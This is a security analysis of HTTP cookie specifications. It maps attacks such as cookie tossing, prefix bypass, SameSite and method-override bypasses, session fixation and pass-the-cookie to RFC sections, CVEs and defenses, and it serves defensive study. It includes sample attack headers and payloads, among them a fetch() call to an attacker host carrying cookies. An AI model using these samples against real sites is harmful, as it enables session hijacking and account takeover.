# Cookie Specification Security Analysis

## Part 1: Cookie Scoping and Domain Isolation Vulnerabilities

### 1.1 Domain/Path Attributes: Subdomain Cookie Injection (Cookie Tossing)

#### Specification Behavior

RFC 6265 §5.1.3 (Domain Matching):
> "A string domain-matches a given domain string if at least one of the following conditions hold:
> - The domain string and the string are identical.
> - All of the following conditions hold:
>   - The domain string is a suffix of the string.
>   - The last character of the string that is not included in the domain string is a '%x2E' ('.') character.
>   - The string is a host name (i.e., not an IP address)."

RFC 6265 §4.1.2.3 (Domain Attribute):
> "If the attribute-value is empty, the behavior is undefined. However, the user agent will ignore the cookie entirely."
> "If the first character of the attribute-value string is '%x2E' ('.'):
> Let cookie-domain be the attribute-value without the leading '%x2E' ('.') character."

**Problem**: Cookies with Domain attribute allow subdomain inheritance, enabling cookie injection from compromised or attacker-controlled subdomains.

#### Security Implication

**Cookie Tossing Attack** (USENIX Security 2023 "Cookie Crumbles"):

If an attacker controls a subdomain (e.g., `attacker.example.com`), they can set cookies that apply to the parent domain (`example.com`):

```http
Set-Cookie: session_id=attacker_value; Domain=.example.com; Path=/
```

When the victim visits `example.com`, both legitimate and malicious cookies are sent:
```http
Cookie: session_id=legitimate_value; session_id=attacker_value
```

**Specification Gap**: RFC 6265 does not specify how servers should handle duplicate cookie names. Implementations vary:
- Some use the **first** occurrence (attacker wins)
- Some use the **last** occurrence (legitimate wins)
- Some concatenate values (unpredictable behavior)

#### Attack Scenario 1: Session Fixation via Cookie Tossing

**Research Source**: Thomas Houhou (2024), CVE-2024-21583 (GitPod)

```
Attack Flow:
1. Attacker controls subdomain: evil.example.com
2. Victim visits evil.example.com
3. Attacker sets cookie:
   Set-Cookie: session_id=ATTACKER_SESSION; Domain=.example.com; Path=/

4. Victim navigates to example.com
5. Server processes attacker's session_id → Session Fixation
```

**Real-world Case**: GitPod (CVE-2024-21583) — Cookie tossing allowed session fixation → account takeover.

#### Attack Scenario 2: OAuth Flow Hijacking

**Research Source**: Snyk Labs (2024) "Hijacking OAUTH flows via Cookie Tossing"

```
1. Attacker sets from subdomain:
   Set-Cookie: oauth_state=attacker_known_value; Domain=.example.com

2. Victim completes OAuth flow with attacker's state value
3. Attacker uses the authorization code with known state
4. Account takeover
```

#### Attack Scenario 3: Self-XSS Exploitation via Cookie Tossing

**Research Source**: Thomas Houhou (2024)

Cookie Tossing escalates self-XSS from low-impact to critical: attacker sets `username=<script>steal_token()</script>` from subdomain, victim visits main site → XSS triggered without interaction.

**Affected Services**: Swisscom, Project Jupyter, Perplexity AI (disclosed 2024-2025)

#### Specification-Based Defense

**`__Host-` Prefix** (RFC 6265bis §4.1.3.1):
> "If a cookie's name begins with a case-sensitive match for the string '__Host-', then the cookie will have been set with a 'Secure' attribute, a 'Path' attribute with a value of '/', and no 'Domain' attribute."

```http
Set-Cookie: __Host-session_id=value; Secure; Path=/
```

Security Properties: Host-only (no subdomain sharing), Secure-only (HTTPS), Path-locked (/).

**`__Secure-` Prefix** (RFC 6265bis §4.1.3.2): Requires Secure attribute, prevents downgrade attacks.

---

### 1.2 Cookie Prefix Bypass: UTF-8 Encoding Attack

#### Vulnerability Discovery

**Research Source**: PortSwigger Research "Cookie Chaos: How to bypass __Host and __Secure cookie prefixes"

PortSwigger researchers discovered that **UTF-8 encoding** can bypass browser prefix protections:

```http
Set-Cookie: __%48ost-session=attacker_value; Secure; Path=/; Domain=.example.com
                 ^^
                 'H' encoded as %48
```

**Bypass Mechanism**:
1. Browser's prefix checker operates on **raw bytes** before URL decoding
2. `__%48ost-` ≠ `__Host-` (prefix check fails → allows Domain attribute)
3. Application receives cookie → **decodes** `%48` to `H` → reads as `__Host-session`

**Affected Browsers**: Chromium-based browsers (Chrome, Edge, Opera)

**Defense**: Application-level validation — verify cookie prefix after URL decoding.

---

### 1.3 Path Attribute: Path Traversal and Cookie Shadowing

#### Specification Behavior

RFC 6265 §5.1.4 (Path Matching):
> "A request-path path-matches a given cookie-path if at least one of the following conditions holds:
> - The cookie-path and the request-path are identical.
> - The cookie-path is a prefix of the request-path, and the last character of the cookie-path is '%x2F' ('/')."

**Problem**: Path-based cookie isolation is weak. Cookies with broader paths can shadow cookies with narrower paths.

#### Attack Scenario: Cookie Shadowing

```
Legitimate cookie:
Set-Cookie: admin_token=secret_value; Path=/admin

Attacker sets from /public endpoint:
Set-Cookie: admin_token=fake_value; Path=/

Request to /admin → Both cookies sent:
Cookie: admin_token=fake_value; admin_token=secret_value

If server uses FIRST occurrence → security bypass
```

**USENIX Security 2023** identified path-based attacks across 9 of 13 major web frameworks (Symfony, CodeIgniter 4, Fastify 등).

**Defense**: Avoid path-based security boundaries. Use `__Host-` prefix instead.

---

### 1.4 Cookie Jar Overflow: Exploiting Browser Cookie Limits

#### Attack Mechanism

**Research Sources**: IBM PTC Security, HackTricks, IRON CTF 2024

**Distinction from Cookie Bomb**:

| Characteristic | Cookie Bomb | Cookie Jar Overflow |
|----------------|-------------|---------------------|
| **Primary Goal** | Denial of Service (DoS) | Session Fixation / Cookie Replacement |
| **Target** | Server-side request processing | Client-side browser cookie storage |
| **Mechanism** | Large cookies exceed header limits | Fill cookie jar to force FIFO deletion |

#### Browser Cookie Limits

- Chrome/Edge: 180 cookies per domain
- Firefox: 150 cookies per domain
- Safari: 600 cookies per domain

**Eviction Policy**: Oldest cookies deleted first (FIFO).

#### Security Implication

**Critical**: HttpOnly cookies set by the server are typically older → **deleted first** when cookie jar overflows.

```javascript
// Step 1: Server sets HttpOnly session cookie (legitimate)
// Step 2: Attacker uses XSS to fill cookie jar (180 junk cookies)
// Step 3: Browser reaches limit → PHPSESSID (oldest) deleted
// Step 4: Attacker sets new PHPSESSID without HttpOnly
// Step 5: HttpOnly protection completely bypassed
```

**CTF Case Study**: IRON CTF 2024 "Secret Notes" — Cookie Jar Overflow + path priority exploitation for admin session takeover.

#### Defense

- **Cookie count monitoring**: Reject requests with >50 cookies
- **`__Host-` prefix**: Attacker cannot set `__Host-` cookies from subdomain
- **CSP**: Block XSS-based cookie injection
- **SameSite**: Limit cross-site cookie injection

---

## Part 2: Cookie Security Attributes

### 2.1 Secure Attribute: HTTPS Enforcement Bypass

#### Specification Behavior

RFC 6265 §5.4:
> "The user agent MUST omit the cookie if [...] the cookie's secure-only-flag is true and the request's URI does not denote a 'secure' protocol."

**Security Goal**: Prevent transmission of sensitive cookies over unencrypted HTTP.

#### Attack Vector 1: Active Network Attacker (MitM)

Secure cookies prevent HTTPS→HTTP leakage, but do NOT prevent HTTP→HTTPS **overwriting**:

```
1. Server sets: Set-Cookie: session_id=legitimate; Secure
2. Network attacker intercepts HTTP request, injects:
   Set-Cookie: session_id=attacker_value
3. Next HTTPS request sends BOTH cookies
4. If server uses FIRST cookie → session fixation
```

**Research Source**: "That's the Way the Cookie Crumbles" (ACM Workshop on Privacy 2016)

#### Attack Vector 2: Subdomain Downgrade Attack

Attacker controls HTTP subdomain → sets non-secure cookie with `Domain=.example.com` → overrides secure cookie.

#### Defense

- **`__Secure-` prefix**: Browser rejects `__Secure-` cookies set over HTTP
- **HSTS**: Forces all connections to HTTPS, preventing MitM cookie injection

---

### 2.2 HttpOnly Attribute: JavaScript Access Prevention

#### Specification Behavior

RFC 6265 §5.2.6 / §8.5:
> "Cookies with the HttpOnly attribute are inaccessible to JavaScript's Document.cookie API."

#### Attack Vector 1: Cookie Sandwich Technique

**Research Source**: PortSwigger Research

Attacker injects delimiter cookies to "sandwich" HttpOnly cookie value. Vulnerable servers that reflect cookie values in responses expose the HttpOnly value.

#### Attack Vector 2: XSS → Credential Usage

HttpOnly prevents `document.cookie` **read** but does NOT prevent cookie **use** in requests:
```javascript
fetch('https://attacker.com/collect', {
  method: 'POST',
  credentials: 'include'  // Cookies automatically included
});
```

#### Attack Vector 3: Cross-Site Tracing (XST)

Historical attack using TRACE method to echo request headers. **Mitigated**: Modern browsers block TRACE in XMLHttpRequest.

---

### 2.3 SameSite Attribute: CSRF Protection Mechanism

#### Specification Behavior

RFC 6265bis §5.3.7:
> "The 'SameSite' attribute limits the scope of the cookie such that it will only be attached to requests if those requests are same-site."

**Values**: Strict (same-site only), Lax (+ top-level GET), None (all, requires Secure)

**Default Behavior**: Chrome/Edge/Opera default to Lax. Safari does NOT (defaults to None).

#### Attack Vector 1: Lax Bypass via GET State Change

Lax allows cookies on top-level GET navigation. If state-changing operations use GET → CSRF possible.

#### Attack Vector 2: Sibling Domain Exploitation

Requests from `subdomain.example.com` to `example.com` are **same-site** → SameSite=Strict cookies ARE sent. XSS on sibling subdomain enables CSRF.

#### Attack Vector 3: Method Override Bypass

**Research Source**: HazanaSec (2023), PortSwigger Lab

Many frameworks support HTTP method override via `_method` parameter:

```http
# SameSite=Lax blocks cross-site POST cookie
POST /change-email → Cookie NOT sent

# Bypass: GET with _method=POST
GET /change-email?email=attacker@evil.com&_method=POST → Cookie IS sent (Lax allows GET)
→ Server processes as POST
```

**Vulnerable Frameworks**: Express.js (method-override), Laravel, Rails, Django (with middleware)

**Defense**: Restrict method override to POST only, require CSRF tokens.

#### Attack Vector 4: 2-Minute Lax Exception Window

**Research Source**: Premsai Blogs (2025)

Chrome's SameSite=Lax has a **2-minute exception window** for newly created cookies — during this period, cookies are sent with ALL requests including cross-site POST. Newly authenticated users are vulnerable.

**Defense**: Check session age for sensitive operations, always require CSRF tokens.

#### Attack Vector 5: Android Intent Scheme Bypass

**Research Source**: Axel Chong (Chromium Android)

Android Chrome treated `intent://` URL scheme as same-site → complete SameSite bypass. **Fixed** in Chrome 2023.

---

## Part 3: Cookie Integrity and Session Management Attacks

### 3.1 Session Fixation via Cookie Injection

#### Specification Behavior

RFC 6265 does not address session lifecycle management — focuses only on cookie storage and transmission, not session integrity.

#### Security Implication

**USENIX Security 2023** identified session fixation as prevalent due to cookie integrity issues.

**Attack**: Attacker forces victim to use attacker-controlled session ID via subdomain cookie tossing or network injection. If application doesn't regenerate session ID after login → attacker hijacks authenticated session.

**Real-world CVE**: CVE-2024-24823 (Graylog) — Session fixation through cookie injection.

**Framework Vulnerabilities (USENIX 2023)**:
- Symfony: MIGRATE strategy didn't clear CSRF storage
- Fastify: Cookie tossing allowed session fixation
- CodeIgniter 4 Shield: Double submit pattern vulnerable to cookie tossing

#### Defense

- **Session regeneration**: Regenerate session ID after authentication
- **`__Host-` prefix**: Prevent subdomain injection

---

### 3.2 Cross-Origin Request Forgery (CSRF/CORF)

#### Specification Behavior

RFC 6265 §8.8: Cookies are automatically attached to requests → enables cross-site request attacks.

#### CORF (Cross-Origin Request Forgery)

**USENIX Security 2023**: New attack variant. SameSite only checks **site**, not **origin**. Attacker with XSS on sibling subdomain (same site) can forge requests → SameSite=Strict cookies ARE sent.

**Affected Frameworks**: 9 of 13 analyzed.

#### Defense

1. **SameSite**: Prevents cross-**site** CSRF (not CORF)
2. **Synchronizer token pattern**: Prevents both CSRF and CORF
3. **Do NOT use double submit cookie pattern**: Vulnerable to cookie tossing (USENIX 2023)

---

### 3.3 Cookie Bomb: Denial of Service Attack

**Research Sources**: HackerOne Reports (X/xAI #57356, GitLab #221041)

**Attack**: Inject large cookies (100×4KB = 400KB) via subdomain or XSS → server rejects requests with `431 Request Header Fields Too Large` → user-specific DoS.

**Defense**: Server-side cookie header size/count limits, `__Host-` prefix, CSP.

---

### 3.4 Pass-the-Cookie Attack

**Research Sources**: Netwrix, MixMode (Cookie-Bite), Embrace The Red

Pass-the-Cookie is the web equivalent of Pass-the-Hash: attackers steal authentication cookies to bypass MFA.

```
Traditional: Phishing → Login → MFA Challenge → Blocked
Pass-the-Cookie: Infostealer → Cookie Theft → Replay Cookie → MFA Bypassed
```

Since cookies represent **post-authentication state**, replaying them bypasses authentication entirely.

#### Cookie-Bite: Azure Entra ID Targeting

Targets `ESTSAUTH` cookie (Enterprise Security Token Service). Valid for 24 hours, grants access to all Azure-integrated services. Stolen via infostealer → imported to attacker's browser → Azure Portal access without MFA.

#### Why Pass-the-Cookie Works

1. **Cookie longevity**: Cookies valid for hours to days
2. **MFA limitation**: MFA only protects initial authentication
3. **Device-agnostic**: Cookies can be replayed from any machine
4. **Invisible**: No failed login attempts → SOC monitoring doesn't detect

#### Defense

- **Token lifetime reduction**: 1-hour max instead of 24 hours
- **Device-based conditional access**: Require compliant device
- **Azure Continuous Access Evaluation (CAE)**: Real-time token revocation on anomaly
- **DBSC**: Cryptographically bind cookies to device (see Part 4.5)

---

## Part 4: Cookie Confidentiality and Theft

### 4.1 Session Hijacking via Cookie Theft

**Research Source**: Georgia Tech "One-Time Cookies" (ACM TOIT)

> "By design, cookies are static and do not change during their lifetime. If an adversary steals authentication cookies, they can impersonate the associated user."

**Attack Vectors**:
1. **Network sniffing**: Cookie over unencrypted HTTP → passive attacker captures session
2. **XSS exfiltration**: `document.cookie` theft (blocked by HttpOnly)
3. **XSSI**: Override Array constructor to capture JSONP data including cookie-based info
4. **Browser extensions**: `chrome.cookies.getAll()` bypasses HttpOnly

---

### 4.2 C4 Bomb: Chrome Cookie Cipher Cracker

**Research Source**: CyberArk (2024)

Chrome 127+ introduced **Application-Bound Encryption** for cookies (Windows DPAPI). CyberArk discovered a **padding oracle attack** against the AES-CBC implementation:

1. Low-privileged attacker reads encrypted cookie from Chrome database
2. Modifies ciphertext bytes systematically
3. Observes Chrome's decryption error messages (oracle)
4. Recovers plaintext byte-by-byte without Administrator privileges

**Disclosure**: December 2024 → Google accepted → partial fix June 2025.

---

### 4.3 Cookie Hunter: Automated Cookie Hijacking Detection

**Paper**: "The Cookie Hunter" (ACM CCS 2020) — Large-scale automated analysis of cookie security across 200,000+ domains. Found extensive hijacking vulnerabilities due to missing Secure, HttpOnly, SameSite attributes.

---

### 4.4 Infostealer Malware and Cookie Theft

Infostealer malware (Lumma Stealer, StealC, RedLine 등) extracts browser cookies from local databases.

**Core Mechanism**:
1. Access browser cookie database (SQLite)
2. Decrypt cookies using Windows DPAPI (runs in user context → no UAC needed)
3. Exfiltrate to C2 server

**Chrome App-Bound Encryption Bypass** (2024): Chrome 127 introduced service-level encryption. Lumma Stealer bypassed within 24 hours by injecting code into Chrome process, which has decryption access. Cat-and-mouse game continues.

**Key Threat**: Stolen cookies enable Pass-the-Cookie attacks (Section 3.4), bypassing all authentication including MFA.

---

### 4.5 Browser Extension Cookie Theft

**Attack Vector**: Malicious or compromised extensions with `cookies` permission.

**Key Facts**:
- `chrome.cookies` API bypasses HttpOnly restriction
- Extensions run persistently, survive restarts
- `onChanged` listener captures token refreshes in real-time

**Notable Incidents**:
- **Cyberhaven Supply Chain Attack** (December 2024): Developer account phished → malicious update pushed to 2.6M users → 12-hour exploitation window
- **ShadyPanda Campaign** (January 2025): 4.3M affected users across 3 extensions with 6-month clean operation period before activation

**Defense**:
- Enterprise extension whitelisting (default deny)
- Browser profile separation (work vs personal)
- Firefox Multi-Account Containers for cookie isolation

---

### 4.6 Device Bound Session Credentials (DBSC)

**Research Sources**: Chrome for Developers, Malwarebytes

**Problem**: All existing cookie protections (HttpOnly, Secure, SameSite, App-Bound Encryption) fail against malware that runs in user context or injects into browser process.

**DBSC Solution**: Cryptographically bind sessions to device hardware (TPM).

```
Traditional Cookie:
Cookie stolen → Replayed on Device B → Server accepts ✗

DBSC:
Cookie stolen → Replayed on Device B → Signature invalid → Server rejects ✓
```

**Mechanism**:
1. Browser generates asymmetric key pair, private key stored in TPM
2. Server associates session with device public key
3. Each request signed with TPM private key
4. Server verifies signature → rejects if device mismatch

**Security Properties**:
- Infostealer: Can steal cookie but not TPM private key → replay fails
- Extension: Can read cookie but cannot sign requests → replay fails
- Network MitM: Can intercept cookie but cannot forge signatures → replay fails

**Browser Support (2025)**: Chrome 131+ (Beta), Windows 11 + TPM 2.0 only.

**Limitations**: Windows only, TPM 2.0 required, no cross-device session portability.

---

## Part 5: Parser Discrepancy and Implementation Vulnerabilities

### 5.1 Cookie Parsing Inconsistencies

**Research Source**: PortSwigger "Bypassing WAFs with the phantom $Version cookie"

RFC 6265 does NOT fully define:
1. How to handle duplicate cookie names
2. How to handle special characters in cookie values
3. How to parse quoted cookie values

#### Attack Vector 1: Phantom $Version Cookie

Legacy RFC 2109 defined `$Version` attribute (deprecated in RFC 6265). Some WAFs skip parsing after `$Version` → payload bypass.

#### Attack Vector 2: Quoted Cookie Values

```http
Set-Cookie: data="value;injected=malicious"
```

- **Browser**: Stores entire string as value
- **Vulnerable server**: Splits on `;` → interprets `injected=malicious` as separate cookie

#### Attack Vector 3: UTF-8 vs ASCII Parsing

Same as Section 1.2 — prefix check on raw bytes vs application URL-decode.

---

### 5.2 Cookie Injection via Special Characters

**Research Source**: PortSwigger "DOM-based cookie manipulation"

```javascript
// Vulnerable code
const userData = new URLSearchParams(window.location.search).get('name');
document.cookie = `username=${userData}`;

// Attack: ?name=attacker%3Badmin%3Dtrue
// → document.cookie = "username=attacker;admin=true"
// → Browser interprets as TWO cookies
```

**CRLF Injection**: Newline characters can enable header injection in some implementations.

**Defense**: Whitelist allowed characters, use `encodeURIComponent()`.

---

## Part 6: Recent CVEs and Attack Cases (2024-2025)

| CVE | Target | Vulnerability Type | Severity |
|-----|--------|-------------------|----------|
| CVE-2024-21583 | GitPod | Cookie Tossing → Session Fixation | High |
| CVE-2024-24823 | Graylog | Session Fixation via Cookie Injection | High |
| CVE-2024-47764 | cookie library | Out-of-bounds characters in name/path/domain | Medium |
| CVE-2024-52804 | Tornado | Cookie Parsing DoS (ReDoS) | High |
| CVE-2025-27794 | Flarum | Session Hijacking via Cookie Manipulation | Critical |
| CVE-2024-53704 | SonicWall SSL VPN | Authentication Bypass via Cookie Injection | Critical |
| CVE-2024-38513 | GoFiber | Session Fixation Attack | High |
| CVE-2024-56733 | Password Pusher | Predictable Session Token Generation | Medium |
| N/A | Chrome Android | SameSite bypass via Intent scheme | High |
| N/A | Chrome DPAPI | C4 Bomb: Padding Oracle on Cookie Encryption | Critical |
| N/A | Chromium | UTF-8 Cookie Prefix Bypass | High |

### CVE Details

#### CVE-2024-52804: Tornado Cookie Parsing DoS

**Target**: Tornado < 6.4.2 | **Severity**: CVSS 7.5

Tornado's cookie parser has a ReDoS vulnerability — malformed cookie headers with nested quotes cause exponential backtracking. Single request → 100% CPU for 30+ seconds.

**Fix**: Tornado 6.4.2+ replaces vulnerable regex with linear-time parser.

---

#### CVE-2025-27794: Flarum Session Hijacking

**Target**: Flarum < 1.8.7 | **Severity**: CVSS 9.1

Flarum's session cookie lacks integrity validation. Session data (including `user_id`) stored as base64-encoded JSON without HMAC → attacker modifies `user_id` → admin access.

**Fix**: Flarum 1.8.7+ adds HMAC signature validation.

---

#### CVE-2024-53704: SonicWall SSL VPN Authentication Bypass

**Target**: SonicOS 7.0.1-7.0.5 | **Severity**: CVSS 9.8

Cookie encryption uses predictable IV → attacker can decrypt and modify session data → unauthenticated access to corporate network. 500,000+ devices vulnerable. Exploited by Akira ransomware group.

**Fix**: SonicOS 7.0.6+ implements unpredictable IVs.

---

#### CVE-2024-38513: GoFiber Session Fixation

**Target**: Fiber < 2.52.5 | **Severity**: CVSS 7.3

GoFiber's session middleware fails to regenerate session IDs after authentication → classic session fixation.

**Fix**: Fiber 2.52.5+ adds `sess.Regenerate()`.

---

#### CVE-2024-56733: Password Pusher Token Interception

**Target**: Password Pusher < 1.47.2 | **Severity**: CVSS 6.5

Session tokens generated using time-based `srand()` seed → predictable tokens. Attacker can brute-force valid tokens within ~10 minute window.

**Fix**: Password Pusher 1.47.2+ uses `SecureRandom.urlsafe_base64(32)`.

---

## Part 7: Cookie vs. Alternative Session Mechanisms

### 7.1 One-Time Cookies (OTC) - Research Proposal

**Research Source**: Georgia Tech (ACM TOIT 2012)

**Proposal**: HMAC-sign each request with session-specific key. Signature is single-use (includes timestamp/nonce) → replay attacks fail. <6ms latency overhead.

**Limitation**: Not adopted — backward compatibility issues, industry preference for JWT.

---

### 7.2 Origin Cookies - Research Proposal

**Research Source**: "Origin Cookies: Session Integrity for Web Applications" (ResearchGate)

**Proposal**: Scope cookies to **origin** (scheme + host + port) instead of domain → immune to subdomain injection.

**Limitation**: Not adopted. RFC 6265bis introduced `__Host-` prefix as compromise.

---

## Part 8: Third-Party Cookie Deprecation (2024-2026)

### 8.1 Background and Timeline

**Third-party cookies**: Set by domains different from the site being visited. Used for cross-site tracking, advertising, analytics, SSO.

**Timeline**:
- **2019**: Safari (ITP 2.1) and Firefox block third-party cookies by default
- **2020**: Google announces Chrome phase-out (target: 2022)
- **2021-2023**: Repeated delays due to Privacy Sandbox readiness and industry pushback
- **2024 Jan**: Chrome begins 1% user trial (30M users)
- **2024 Jul**: Google pivots — will NOT force deprecation
- **2025 Apr**: Final decision — third-party cookies remain, user chooses via browser setting

### 8.2 Browser Landscape (2025-2026)

| Browser | Default Behavior | Market Share |
|---------|------------------|--------------|
| **Chrome** | Allow (user opt-in to block) | 63% |
| **Safari** | Block all (no opt-out) | 20% |
| **Firefox** | Block known trackers | 7% |
| **Edge** | Allow (follows Chrome) | 5% |
| **Brave** | Block all | 1% |

~70% of users still have third-party cookies enabled (2026).

### 8.3 Security Implications

**Third-party cookies enable**:
1. **Cross-site tracking**: Ad networks build comprehensive user profiles across sites
2. **CSRF amplification**: Cookies automatically sent in third-party context (unless SameSite blocks)
3. **XS-Leaks**: Detect user authentication status via third-party cookie presence/absence

**Third-party cookie blocking mitigates**: CSRF (cookies not sent in third-party context), cross-site tracking, timing side-channel attacks.

### 8.4 Alternatives

- **Partitioned Cookies (CHIPS)**: `Set-Cookie: session=abc; SameSite=None; Secure; Partitioned` — cookies isolated per top-level site, no cross-site tracking
- **Storage Access API**: Explicit user permission for third-party cookie access in iframes
- **Privacy Sandbox**: Topics API (interest-based ads), FLEDGE (on-device ad auction), Attribution Reporting API (aggregated conversion measurement)

---

## Appendix A: Attack-Specification-Defense Mapping

| # | Attack Type | Exploited Spec Behavior | RFC Reference | Specification-Based Defense |
|---|------------|------------------------|---------------|----------------------------|
| 1 | Cookie Tossing (Subdomain Injection) | Domain attribute inheritance | RFC 6265 §5.1.3 | `__Host-` prefix (RFC 6265bis §4.1.3.1) |
| 2 | UTF-8 Prefix Bypass | Prefix check before URL decode | RFC 6265bis §4.1.3 | Application-level validation |
| 3 | Path-based Cookie Shadowing | Path prefix matching | RFC 6265 §5.1.4 | Avoid path-based security boundaries |
| 4 | Cookie Jar Overflow | Browser cookie count limits (FIFO eviction) | RFC 6265 §6.1 | Cookie count monitoring + `__Host-` |
| 5 | Secure Downgrade Attack | Non-secure cookie overwrites secure | RFC 6265 §5.4 | `__Secure-` prefix + HSTS |
| 6 | HttpOnly Bypass (Cookie Sandwich) | Cookie parsing inconsistency | RFC 6265 §4.2.1 | Strict cookie parsing |
| 7 | SameSite Lax Bypass | Top-level navigation exception | RFC 6265bis §5.3.7 | Use POST for state changes |
| 8 | SameSite Method Override Bypass | Framework method override + Lax | RFC 6265bis §5.3.7 | Disable method override for GET |
| 9 | SameSite 2-Minute Window | Lax exception for new cookies | RFC 6265bis §5.3.7 | Check session age for critical actions |
| 10 | SameSite None Downgrade | No SameSite inheritance protection | RFC 6265bis §5.3.7 | `__Secure-` prefix enforcement |
| 11 | Session Fixation | No session regeneration requirement | N/A | Regenerate session ID after auth |
| 12 | Pass-the-Cookie (MFA Bypass) | Static session credentials | N/A | DBSC (device binding) + CAE |
| 13 | CSRF | Automatic cookie attachment | RFC 6265 §8.8 | SameSite + CSRF tokens |
| 14 | CORF (Cross-Origin RF) | SameSite only checks site, not origin | RFC 6265bis §5.3.7 | Origin validation + CSRF tokens |
| 15 | Cookie Bomb (DoS) | No cookie count/size limits | RFC 6265 §6.1 | Server-side limits + `__Host-` |
| 16 | Network Sniffing | HTTP transmission allowed | RFC 6265 §5.4 | Secure attribute + HSTS |
| 17 | XSS Cookie Theft | JavaScript cookie access | RFC 6265 §8.5 | HttpOnly attribute |
| 18 | Infostealer Malware | Cookies stored in plaintext/DPAPI | N/A | DBSC (TPM-bound keys) |
| 19 | Browser Extension Theft | Extensions have full cookie access | N/A | Extension whitelisting + auditing |
| 20 | Cookie Parsing Injection | Undefined special character handling | RFC 6265 §4.2 | Input validation/sanitization |
| 21 | C4 Bomb (DPAPI Oracle) | Browser encryption implementation | N/A | Browser-level fix required |
| 22 | Third-Party Cookie Tracking | Cross-site cookie scope | RFC 6265 §5.1.3 | Block third-party cookies + Privacy Sandbox |

---

## Appendix B: Cookie Security Validation Checklist

### Cookie Attributes
- [ ] **Secure**: All auth/session cookies MUST have Secure flag
- [ ] **HttpOnly**: All auth/session cookies MUST have HttpOnly flag
- [ ] **SameSite**: Strict for sensitive ops, Lax for general auth, None only if cross-site required + Secure
- [ ] **Domain**: Avoid explicit Domain attribute (host-only preferred)
- [ ] **Path**: Do NOT use for security boundaries
- [ ] **Expires/Max-Age**: Set appropriate expiration

### Cookie Prefixes
- [ ] **`__Host-`**: Use for all auth/session cookies (enforces Secure, Path=/, no Domain)
- [ ] **`__Secure-`**: Use for sensitive cookies that need Domain attribute

### Session Management
- [ ] Regenerate session ID after authentication
- [ ] Regenerate session ID after privilege escalation
- [ ] Implement session timeout
- [ ] Properly invalidate session on logout (server-side)

### CSRF Protection
- [ ] SameSite as first defense
- [ ] Synchronizer token pattern (NOT double submit cookie)
- [ ] State-changing operations use POST/PUT/DELETE (never GET)

### Input Validation
- [ ] Cookie name/value validation (whitelist characters)
- [ ] Cookie count limits (<50 per domain)
- [ ] Cookie size limits (<8KB header)
- [ ] Reject/escape semicolons, newlines, quotes

### Transport Security
- [ ] HTTPS enforcement + HSTS with includeSubDomains and preload
- [ ] Eliminate mixed content

---

## Appendix C: Cookie Security Best Practices Summary

### Recommended Cookie Configuration

```http
BEST: Authentication/session cookie
Set-Cookie: __Host-session_id=<random_value>; Secure; Path=/; HttpOnly; SameSite=Strict; Max-Age=3600

GOOD: General authentication (allows top-level navigation)
Set-Cookie: __Host-auth_token=<random_value>; Secure; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400

ACCEPTABLE: Cross-site widget (only if necessary)
Set-Cookie: widget_state=<value>; Secure; SameSite=None; Partitioned

NEVER: Insecure cookie
Set-Cookie: user_id=<value>; Domain=.example.com
```

---

## References

### RFC Specifications
- **RFC 6265**: HTTP State Management Mechanism (2011)
- **RFC 6265bis**: Cookies: HTTP State Management Mechanism (Draft, ongoing updates)
- **RFC 6797**: HTTP Strict Transport Security (HSTS)

### Academic Research Papers
- **USENIX Security 2023**: "Cookie Crumbles: Breaking and Fixing Web Session Integrity" - Marco Squarcina et al.
- **USENIX Security 2015**: "Cookies Lack Integrity: Real-World Implications"
- **ACM TOIT 2012**: "One-Time Cookies: Preventing Session Hijacking Attacks with Stateless Authentication Tokens" - Georgia Tech
- **ACM CCS 2020**: "The Cookie Hunter: Automated Black-box Auditing for Web Authentication"
- **ACM Workshop on Privacy 2016**: "That's the Way the Cookie Crumbles: Evaluating HTTPS Enforcing Mechanisms"

### Industry Research
- **PortSwigger Research**: Cookie Chaos, Cookie Sandwich, Phantom $Version, SameSite Bypass, DOM-based manipulation
- **CyberArk (2024)**: "C4 Bomb: Blowing Up Chrome's AppBound Cookie Encryption"
- **Snyk Labs (2024)**: "Hijacking OAUTH flows via Cookie Tossing"
- **Thomas Houhou (2024)**: Cookie Tossing exploitation patterns
- **IBM PTC Security**: Cookie Jar Overflow Attack
- **Netwrix (2024)**: Pass-the-Cookie Attack
- **MixMode (2024)**: Cookie-Bite MFA Bypass
- **Chrome for Developers (2024)**: Device Bound Session Credentials (DBSC)
- **HazanaSec (2023)**: SameSite Bypass via Method Override
- **Premsai Blogs (2025)**: Advanced CSRF: 2-Minute Lax Exception Window

### CVE Disclosures
- CVE-2024-21583 (GitPod), CVE-2024-24823 (Graylog), CVE-2024-47764 (cookie library)
- CVE-2024-52804 (Tornado), CVE-2025-27794 (Flarum), CVE-2024-53704 (SonicWall)
- CVE-2024-38513 (GoFiber), CVE-2024-56733 (Password Pusher)

### Security Standards
- OWASP ASVS, Session Management Cheat Sheet, CSRF Prevention Cheat Sheet
- CWE-1275, CWE-614
- W3C Storage Access API, WebAuthn Level 2
